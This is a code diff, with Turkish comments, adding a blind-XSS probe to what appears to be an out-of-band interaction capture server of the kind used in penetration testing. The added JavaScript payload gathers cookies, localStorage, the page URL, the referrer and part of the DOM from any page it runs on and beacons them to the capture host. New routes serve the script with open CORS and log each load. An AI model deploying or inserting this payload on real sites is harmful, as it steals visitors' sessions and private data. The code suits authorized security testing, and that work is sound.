@@ -61,6 +61,62 @@ async def _read_limited(request: Request, limit: int) -> tuple[bytes, bool]:
     return b"".join(chunks), False
 
 
+# Blind-XSS probe toplayıcısı. Hedef sayfada çalışınca bağlamı (cookie, URL,
+# DOM, localStorage) toplayıp sendBeacon ile {token}.oob/xss adresine gönderir;
+# o POST normal HTTP yakalaması olarak kaydedilir. __BASE__ üretimde gerçek
+# yakalama adresiyle değiştirilir.
+_PROBE_JS = """(function(){try{
+var d={url:location.href,cookie:document.cookie,referrer:document.referrer,
+ua:navigator.userAgent,origin:location.origin,title:document.title,
+dom:document.documentElement.outerHTML.slice(0,8000)};
+try{d.ls=JSON.stringify(localStorage)}catch(e){}
+navigator.sendBeacon("__BASE__xss",JSON.stringify(d));
+}catch(e){new Image().src="__BASE__xss?err="+encodeURIComponent(e);}})();"""
+
+
+async def _probe_response(request: Request, token: str) -> Response:
+    settings = get_settings()
+    storage = request.app.state.storage
+    hook = await storage.get_hook(token)
+    if hook is None:
+        return Response(content="", status_code=404)
+    # Probe'un yüklendiği anı kaydet (XSS tetiklendi sinyali).
+    interaction = Interaction(
+        token=token, protocol=Protocol.HTTP, source_ip=_client_ip(request),
+        parsed={
+            "method": request.method,
+            "path": request.url.path,
+            "query": multi_items(request.query_params.multi_items()),
+            "headers": multi_items(request.headers.items()),
+            "body": None,
+            "note": "blind-xss probe yuklendi",
+        },
+    )
+    await storage.save_interaction(interaction)
+    await request.app.state.bus.publish(_summary(interaction))
+    if hook.notify:
+        asyncio.create_task(request.app.state.pipeline.handle(interaction))
+    js = _PROBE_JS.replace("__BASE__", settings.capture_url(token))
+    return Response(
+        content=js, media_type="application/javascript",
+        headers={"Access-Control-Allow-Origin": "*", "Cache-Control": "no-store"},
+    )
+
+
+@host_router.get("/p.js")
+async def probe_host(request: Request):
+    settings = get_settings()
+    token = resolve_token(request.headers.get("host", ""), settings.base_domain)
+    if token is None:
+        return Response(content="", status_code=404)
+    return await _probe_response(request, token)
+
+
+@path_router.get("/c/{token}/p.js")
+async def probe_path(token: str, request: Request):
+    return await _probe_response(request, token)
+
+
 @host_router.api_route("/{path:path}", methods=_METHODS)
 async def capture_host(path: str, request: Request, background_tasks: BackgroundTasks):
     settings = get_settings()
